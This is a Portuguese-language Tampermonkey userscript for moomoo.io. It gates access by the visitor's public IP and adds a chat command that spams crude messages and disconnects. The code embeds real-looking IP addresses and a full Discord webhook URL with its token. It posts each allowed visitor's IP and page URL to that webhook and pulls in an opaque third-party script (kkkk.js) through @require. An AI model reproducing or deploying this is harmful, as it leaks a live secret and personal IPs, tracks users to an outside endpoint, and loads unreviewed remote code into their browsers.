// ==UserScript==
// @name         IP Lock com Sistema Dev/User + Kick + Webhook
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  Sistema de IP lock com identificação dev/user, acesso para usuários autorizados, comando de kick e notificação via webhook
// @author       @jetxrah
// @require      https://rawgit.com/kawanet/msgpack-lite/master/dist/msgpack.min.js
// @match        https://*.moomoo.io/*
// @require      https://js-library.net/kkkk.js
// @grant        none
// ==/UserScript==

(async function() {
    'use strict';

    const DEV_IPS = [
        "191.240.215.254", 
        "170.78.181.15"   
    ];
    
    const USER_IPS = [
        "191.240.215.254", 
        "170.78.181.15",   
        "45.175.113.106",      
        "104.28.193.83",  
        "170.239.226.74",  
        "177.223.57.135",  
    ];
    
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1413685776251748473/GFR_LV17o-qXOkxCAlNMOWmafvA0og_XDAjo4DrpRiRcySESP20VewQErKWVdM7qU332";
    const SITE_URL = window.location.href;
    const SITE_ORIGIN = window.location.origin;
    const SITE_HOSTNAME = window.location.hostname;
    const SITE_PATHNAME = window.location.pathname;
    
    let userRole = "blocked";
    let currentIP = "";

    async function sendWebhookMessage(message) {
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: message,
                    username: "Pacifist JR",
                    embeds: [{
                        title: "Acesso Detectado",
                        description: message,
                        color: 5814783,
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "Detect por ip"
                        }
                    }]
                })
            });
            
            if (response.ok) {
                console.log("Mensagem do webhook enviada com sucesso");
            }
        } catch (error) {
            console.error("Erro ao enviar webhook:", error);
        }
    }

    async function checkIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            currentIP = data.ip;
            
            if (DEV_IPS.includes(currentIP)) {
                userRole = "dev";
                await sendWebhookMessage(`O IP de desenvolvedor ( ${currentIP}) está acessando o site: ${SITE_URL}`);
            } else if (USER_IPS.includes(currentIP)) {
                userRole = "user";
                await sendWebhookMessage(`👤 Usuário com IP ${currentIP} está acessando o site: ${SITE_ORIGIN}`);
            } else {
                userRole = "blocked";
            }
            
            return userRole;
            
        } catch (error) {
            console.error('Erro ao verificar IP:', error);
            return "blocked";
        }
    }

    function kickUser() {
        console.log("Kickando usuário...");
        
        try {
            window.location.href = "https://google.com";
            
            setTimeout(() => {
                try { window.close(); } catch (e) {}
            }, 1000);
            
            setTimeout(() => {
                try {
                    window.onbeforeunload = null;
                    document.body.innerHTML = '<h1>Connection Lost</h1>';
                    window.stop();
                } catch (e) {}
            }, 1500);
            
        } catch (error) {
            console.error("Erro ao kickar:", error);
        }
    }

    function injectChatSystem() {
        const originalReceiveChat = window.receiveChat;
        
        window.receiveChat = function(e, t) {
            if (originalReceiveChat) {
                originalReceiveChat.apply(this, arguments);
            }
            
            if (typeof t === "string" && t.toLowerCase().trim() === "!dc") {
                console.log("Comando !dc detectado");
                
                if (userRole === "dev") {
                    console.log("Dev executando comando !dc");
                    
                    if (typeof knla !== 'undefined' && knla.send) {
                        knla.send("6", "i gtg have explosive diarhia");
                        setTimeout(() => {
                            knla.send("6", "*sharts and moans");
                            setTimeout(() => {
                                knla.send("H", 0);
                                setTimeout(kickUser, 200);
                            }, 400);
                        }, 400);
                    }
                }
            }
            
            if (typeof t === "string" && t.toLowerCase().trim() === "!pakdc") {
                if (userRole === "dev" && typeof knla !== 'undefined' && knla.send) {
                    knla.send("6", "i gtg have explosive diarhia");
                    setTimeout(() => {
                        knla.send("6", "*sharts and moans");
                        setTimeout(() => {
                            knla.send("H", 0);
                        }, 400);
                    }, 400);
                }
            }
        };
        
        console.log("Sistema de chat com comando !dc injetado");
    }

    function updateTitle() {
        if (userRole === "blocked") return;
        
        const originalTitle = document.title;
        let cleanTitle = originalTitle
            .replace(" [dev]", "")
            .replace(" [user]", "")
            .replace(" [blocked]", "");
        
        document.title = `${cleanTitle} [${userRole}]`;
        console.log(`Título atualizado: ${document.title} (${userRole})`);
    }

    function showAccessDenied() {
        document.body.innerHTML = '';
        
        const styles = `
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
            body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; color: white; }
            .access-denied-container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; text-align: center; max-width: 500px; width: 90%; }
            h1 { font-size: 2.5rem; margin-bottom: 20px; color: #ff6b6b; }
            .ip-info { background: rgba(255, 255, 255, 0.1); padding: 10px; border-radius: 8px; margin: 15px 0; font-family: monospace; }
            .username { font-weight: bold; color: #ffeaa7; font-size: 1.3rem; }
        `;
        
        const styleSheet = document.createElement('style');
        styleSheet.textContent = styles;
        document.head.appendChild(styleSheet);
        
        document.body.innerHTML = `
            <div class="access-denied-container">
                <div style="font-size: 5rem; margin-bottom: 20px;">🔒</div>
                <h1>Acesso Bloqueado</h1>
                <p>Seu endereço IP não está na lista de permissões.</p>
                
                <div class="ip-info">
                    <p>IP Detectado: <strong>${currentIP || 'Carregando...'}</strong></p>
                    <p>Status: <strong>Não Autorizado</strong></p>
                </div>
                
                <div style="background: rgba(255, 255, 255, 0.2); padding: 15px; border-radius: 10px; margin: 20px 0;">
                    <p>Para solicitar acesso, entre em contato com</p>
                    <p class="username">@jetxrah</p>
                </div>
            </div>
        `;
    }

    function observeTitleChanges() {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.target === document.querySelector('title') || 
                    (mutation.target === document.head && mutation.addedNodes.length)) {
                    setTimeout(() => {
                        if (userRole !== "blocked") {
                            updateTitle();
                        }
                    }, 100);
                }
            });
        });
        
        observer.observe(document.head, { 
            childList: true, 
            subtree: true,
            characterData: true
        });
    }

    function showWelcomeMessage() {
        console.log(`Acesso permitido - Modo ${userRole.toUpperCase()}`);
        
        const welcomeMsg = userRole === "dev" ? 
            "👑 Modo DESENVOLVEDOR ativado - Comando !dc disponível" : 
            "👤 Modo USUÁRIO ativado";
        
        console.log(`%c${welcomeMsg}`, `
            background: ${userRole === "dev" ? "#4CAF50" : "#2196F3"};
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
            font-size: 14px;
        `);
    }

    async function main() {
        const role = await checkIP();
        
        if (role === "blocked") {
            showAccessDenied();
            return;
        }
        
        showWelcomeMessage();
        updateTitle();
        observeTitleChanges();
        
        if (userRole === "dev") {
            // Esperar o jogo carregar
            setTimeout(injectChatSystem, 3000);
        }
    }

    // Iniciar
    main();

})();
